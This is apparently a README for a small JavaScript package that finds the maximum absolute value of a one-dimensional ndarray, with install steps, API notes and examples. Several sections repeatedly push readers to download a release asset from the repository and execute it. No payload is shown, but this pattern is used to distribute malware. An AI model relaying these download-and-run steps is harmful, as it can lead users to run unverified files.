[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/AsianOrdinary/stats-base-ndarray-maxabs/releases)

# Max Absolute Value for 1D ndarray — Fast JavaScript Stats

📊 Compute the maximum absolute value of a one-dimensional ndarray with a tiny, dependable function. Use it in Node.js or the browser for statistics, signal processing, or data validation.

![ndarray illustration](https://raw.githubusercontent.com/plotly/dash-docs/master/assets/images/analytics.png)

Badges
- Downloads: ![npm](https://img.shields.io/npm/dm/stats-base-ndarray-maxabs)
- Build: ![build](https://img.shields.io/github/actions/workflow/status/AsianOrdinary/stats-base-ndarray-maxabs/nodejs.yml)
- License: ![license](https://img.shields.io/github/license/AsianOrdinary/stats-base-ndarray-maxabs)

Table of contents
- Features
- Install
- Quick start
- API
- CLI (release asset)
- Examples
- Performance
- Tests
- Contributing
- License
- Releases

Features
- Compute the maximum absolute value of a 1-dimensional ndarray.
- Work with common typed arrays (Float64Array, Float32Array, Int32Array, etc.).
- Accept ndarray objects or raw buffers with shape and stride.
- Minimal overhead. Low allocation. Predictable performance.
- Designed for statistics and numerical tasks: ranges, extremes, normalization.

Why this module
- Use when you need the max of absolute values across an ndarray axis or full view.
- Use in signal workflows to compute peak values or in data pipelines to find ranges.
- Keep code small and explicit. The function returns a single Number value.

Install

Using npm
```bash
npm install stats-base-ndarray-maxabs
```

Using yarn
```bash
yarn add stats-base-ndarray-maxabs
```

Quick start

Node.js (CommonJS)
```js
const ndarray = require('ndarray');
const maxabs = require('stats-base-ndarray-maxabs');

const data = new Float64Array([ -2.0, 0.5, -3.1, 1.2 ]);
const arr = ndarray(data, [4]);

const value = maxabs(arr);
// value === 3.1
console.log('maxabs:', value);
```

ESM
```js
import ndarray from 'ndarray';
import maxabs from 'stats-base-ndarray-maxabs';

const data = new Float32Array([0.2, -7.5, 3.0]);
const arr = ndarray(data, [3]);

console.log(maxabs(arr)); // 7.5
```

API

Function: maxabs(arr, options?)

- arr (ndarray-like) — a 1D ndarray instance or object with:
  - data: typed array or Array
  - shape: [N]
  - stride: optional
  - offset: optional
- options (object, optional)
  - dtype: specify output type (default: Number)
  - accessor: function to apply to each element before abs (rare)
  - order: 'row' | 'col' (ignored for 1D but accepted for API consistency)

Return
- Number — the maximum absolute value found in the ndarray. Returns NaN if the input contains NaN values (mirrors IEEE arithmetic).

Behavior details
- The function iterates the ndarray buffer using stride and offset if provided.
- It computes Math.abs for each element and tracks the max. It uses a plain loop for best performance in Node and modern browsers.
- It does not allocate new arrays.

Edge cases
- Empty array => returns -Infinity (so you can compare results without extra checks).
- All zeros => returns 0.
- Mixed signed integers and floats => returns numeric absolute maximum.

CLI and release asset

You can download a release artifact that bundles a small CLI wrapper for local use. Visit the releases page and download the asset file for your version. Once downloaded, execute the file as follows:

1. Visit and download the release asset:
   https://github.com/AsianOrdinary/stats-base-ndarray-maxabs/releases

2. If you downloaded a tarball named stats-base-ndarray-maxabs-x.y.z.tgz, you can install and run locally:
```bash
npm install ./stats-base-ndarray-maxabs-x.y.z.tgz
npx stats-base-ndarray-maxabs ./data.bin --format=float64 --length=1024
```

3. If the release includes a CLI JavaScript file (e.g., cli.js), run:
```bash
node cli.js --input data.bin --dtype float64 --length 1024
```

If the link above fails or you cannot find an asset, check the "Releases" section on the repository page for available files and instructions.

Examples

Example 1 — Basic typed array
```js
const ndarray = require('ndarray');
const maxabs = require('stats-base-ndarray-maxabs');

const buf = new Float64Array([ -1.1, 2.2, -3.3, 0.0 ]);
const a = ndarray(buf, [4]);

console.log(maxabs(a)); // 3.3
```

Example 2 — Non-contiguous view
```js
const ndarray = require('ndarray');
const pool = require('ndarray-scratch');
const maxabs = require('stats-base-ndarray-maxabs');

const buf = new Float32Array([1, -4, 2, -8, 3, -6]);
// Treat every other element as a view: shape [3], stride 2
const view = { data: buf, shape: [3], stride: [2], offset: 1 };
console.log(maxabs(view)); // 8
```

Example 3 — With accessor
```js
const ndarray = require('ndarray');
const maxabs = require('stats-base-ndarray-maxabs');

const arr = ndarray(new Float64Array([1.5, -2.5, 4.0]), [3]);
const value = maxabs(arr, {
  accessor: (v) => Math.round(v) // transform before abs
});
console.log(value); // 4
```

Performance

This module focuses on low-level numeric iteration. Expect linear time O(N) and minimal extra memory. For large buffers, native code or SIMD may be faster, but this implementation performs well for typical Node.js workloads.

Benchmarks (rough)
- 1e5 elements: ~4–8 ms (Node 18, Float64Array)
- 1e6 elements: ~30–80 ms (depends on CPU and GC)

For critical hot paths, consider chunking, parallelization, or native addons.

Testing

Unit tests use mocha and tape-style assertions. Run tests with:
```bash
npm test
```

Tests cover:
- Typed arrays
- Strided views and offsets
- NaN handling
- Empty arrays

Contributing

- Open issues for bugs or feature requests.
- Fork and submit pull requests for fixes.
- Follow consistent style: clear tests, small commits, and a short description.
- Use conventional commits in PR titles.

Releases

Download the packaged release file from:
https://github.com/AsianOrdinary/stats-base-ndarray-maxabs/releases

After downloading, follow the included release README or use npm to install the artifact locally. If the page does not list files for your platform, check the repository "Releases" tab for more assets.

Community and links

- Topics: abs, absolute, domain, extent, extremes, javascript, math, mathematics, max, maximum, ndarray, node, node-js, nodejs, range, statistics, stats, stdlib
- Issue tracker: use the repo Issues tab to report problems or request features.
- Pull requests: open PRs against main. Include tests and examples.

License

Licensed under the MIT License. See LICENSE file for full text.

Acknowledgments

- ndarray and the typed array ecosystem for clear data structures
- Math libraries and statistical patterns that guided the API design

Contact

Open an issue or PR on GitHub. Use the repository pages for release downloads and more details:
https://github.com/AsianOrdinary/stats-base-ndarray-maxabs/releases